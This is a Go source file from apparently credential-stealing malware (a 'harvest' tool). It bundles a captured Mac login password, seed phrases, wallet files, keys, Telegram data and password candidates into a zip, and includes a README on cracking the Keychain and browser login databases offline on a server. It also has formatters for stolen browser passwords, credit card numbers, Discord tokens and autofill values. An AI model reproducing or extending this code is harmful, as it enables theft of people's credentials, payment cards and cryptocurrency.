// export_logs.go — materializes human-readable log files for the harvest zip.
//
// Converts CollectionResult slices into text/JSON under logs/{browsers,apps,...}
// and meta/*. Paths use the constants from export_layout.go so the panel and
// README stay in sync with on-disk layout.
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"strings"

	"recovery/recovery"
)

// buildAllLogFiles returns zipPath → file contents for summary, README, and meta logs.
// Offline-crack: no decrypted passwords/cookies; password file for server-side crack.
func buildAllLogFiles(p *harvestPayload) map[string][]byte {
	if p == nil {
		return map[string][]byte{
			"summary.txt": []byte(harvestSummary(p)),
		}
	}

	r := p.Result
	if r == nil {
		r = &recovery.CollectionResult{}
	}
	out := map[string][]byte{
		"summary.txt": []byte(harvestSummary(p)),
		"README.txt":  []byte(zipReadmeText()),
	}

	// Mac login password for offline decrypt of keychain + browser DBs on the server.
	if p.MacLoginPassword != "" {
		out["offline/mac_login_password.txt"] = []byte(p.MacLoginPassword + "\n")
		out["offline/README.txt"] = []byte(offlineCrackReadme())
	}

	if data := jsonLog("extensions.json", r.Extensions); len(data) > 0 {
		out[zipLogsBrowsers+"extensions.json"] = data
	}

	if r.Gaming != nil {
		if data := jsonLog("gaming.json", r.Gaming); len(data) > 0 {
			out[zipLogsApps+"gaming.json"] = data
		}
	}
	if r.VPNs != nil {
		if data := jsonLog("vpns.json", r.VPNs); len(data) > 0 {
			out[zipLogsApps+"vpns.json"] = data
		}
	}

	if data := seedsLog(p.Seeds); len(data) > 0 {
		out[zipLogsSeeds+"seeds.txt"] = data
	}

	if data := passwordCandidatesLog(r.PasswordCandidates); len(data) > 0 {
		out[zipLogsKeys+"password_candidates.txt"] = data
	}
	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
		out[zipLogsKeys+"password_candidates.json"] = data
	}
	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
		out[zipLogsKeys+"keys.json"] = data
	}

	if data := jsonLog("wallets.json", r.Wallets); len(data) > 0 {
		out[zipLogsMeta+"wallets.json"] = data
	}
	if data := jsonLog("files.json", r.Files); len(data) > 0 {
		out[zipLogsMeta+"files.json"] = data
	}
	if data := jsonLog("telegram.json", r.Telegram); len(data) > 0 {
		out[zipLogsMeta+"telegram.json"] = data
	}
	// harvest.json omits MacLoginPassword (json:"-"); password is only under offline/.
	if data, err := json.MarshalIndent(p, "", "  "); err == nil && len(data) > 0 {
		out[zipLogsMeta+"harvest.json"] = data
	}
	return out
}

func offlineCrackReadme() string {
	return `offline-crack package
=====================

mac_login_password.txt   Mac user login password (from modal / -mac-password)

Use this password offline with:
  keychain/login.keychain-db     → unlock Keychain → Chrome Safe Storage
  browsers/*/Login Data          → decrypt with Safe Storage key
  wallets/                       → extension LevelDB / desktop wallet files

This archive does NOT contain on-box decrypted passwords.txt.
`
}

func appCredentialsLog(rows []recovery.AppCredentialResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Application: %s\n", row.Application)
		if row.Host != "" {
			fmt.Fprintf(&b, "Host: %s\n", row.Host)
		}
		if row.Port > 0 {
			fmt.Fprintf(&b, "Port: %d\n", row.Port)
		}
		if row.Username != "" {
			fmt.Fprintf(&b, "Username: %s\n", row.Username)
		}
		if row.Password != "" {
			fmt.Fprintf(&b, "Password: %s\n", row.Password)
		}
		if row.Protocol != "" {
			fmt.Fprintf(&b, "Protocol: %s\n", row.Protocol)
		}
		if row.Extra != "" {
			fmt.Fprintf(&b, "Extra: %s\n", row.Extra)
		}
	}
	return b.Bytes()
}

func passwordCandidatesLog(rows []recovery.PasswordCandidateResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		if row.Detail != "" {
			fmt.Fprintf(&b, "Detail: %s\n", row.Detail)
		}
		fmt.Fprintf(&b, "Password: %s\n", row.Password)
	}
	return b.Bytes()
}

func passwordsLog(rows []recovery.PasswordResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		b.WriteString("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
		fmt.Fprintf(&b, "Username: %s\n", row.Username)
		fmt.Fprintf(&b, "Password: %s\n", row.Password)
	}
	return b.Bytes()
}

func historyLog(rows []recovery.HistoryResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n---\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s | Visits: %d\n", row.Browser, row.Profile, row.VisitCount)
		if row.Title != "" {
			fmt.Fprintf(&b, "Title: %s\n", row.Title)
		}
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
		if row.LastVisitTime > 0 {
			fmt.Fprintf(&b, "Last visit: %d\n", row.LastVisitTime)
		}
	}
	return b.Bytes()
}

func autofillLog(rows []recovery.AutofillResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		fmt.Fprintf(&b, "Field: %s\n", row.Name)
		fmt.Fprintf(&b, "Value: %s\n", row.Value)
	}
	return b.Bytes()
}

func bookmarksLog(rows []recovery.BookmarkResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		if row.Name != "" {
			fmt.Fprintf(&b, "Name: %s\n", row.Name)
		}
		fmt.Fprintf(&b, "URL: %s\n", row.URL)
	}
	return b.Bytes()
}

func creditCardsLog(rows []recovery.CreditCardResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Browser: %s | Profile: %s\n", row.Browser, row.Profile)
		if row.NameOnCard != "" {
			fmt.Fprintf(&b, "Name: %s\n", row.NameOnCard)
		}
		fmt.Fprintf(&b, "Number: %s\n", row.CardNumber)
		fmt.Fprintf(&b, "Expires: %02d/%d\n", row.ExpirationMonth, row.ExpirationYear)
		if row.Nickname != "" {
			fmt.Fprintf(&b, "Nickname: %s\n", row.Nickname)
		}
	}
	return b.Bytes()
}

func discordTokensLog(rows []recovery.DiscordTokenResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		fmt.Fprintf(&b, "Token: %s\n", row.Token)
	}
	return b.Bytes()
}

func seedsLog(rows []recovery.SeedResult) []byte {
	if len(rows) == 0 {
		return nil
	}
	var b bytes.Buffer
	for i, row := range rows {
		if i > 0 {
			b.WriteString("\n---\n")
		}
		fmt.Fprintf(&b, "Source: %s\n", row.Source)
		if row.Path != "" {
			fmt.Fprintf(&b, "Path: %s\n", row.Path)
		}
		fmt.Fprintf(&b, "Words: %d\n", row.Words)
		fmt.Fprintf(&b, "Phrase: %s\n", row.Phrase)
	}
	return b.Bytes()
}

func jsonLog(name string, v any) []byte {
	if v == nil {
		return nil
	}
	data, err := json.MarshalIndent(v, "", "  ")
	if err != nil || len(data) == 0 || string(data) == "null" {
		return nil
	}
	_ = name
	return data
}

func expandLargeLogParts(parts map[string][]byte, maxPart int) map[string][]byte {
	if maxPart <= 0 {
		return parts
	}
	out := make(map[string][]byte, len(parts))
	for name, data := range parts {
		if len(data) <= maxPart {
			out[name] = data
			continue
		}
		chunks := splitBytesBySize(data, maxPart)
		base, ext := splitFilename(name)
		for i, chunk := range chunks {
			chunkName := fmt.Sprintf("%s-part%d%s", base, i+1, ext)
			out[chunkName] = chunk
		}
	}
	return out
}

func splitFilename(name string) (base, ext string) {
	dot := strings.LastIndex(name, ".")
	if dot <= 0 {
		return name, ""
	}
	return name[:dot], name[dot:]
}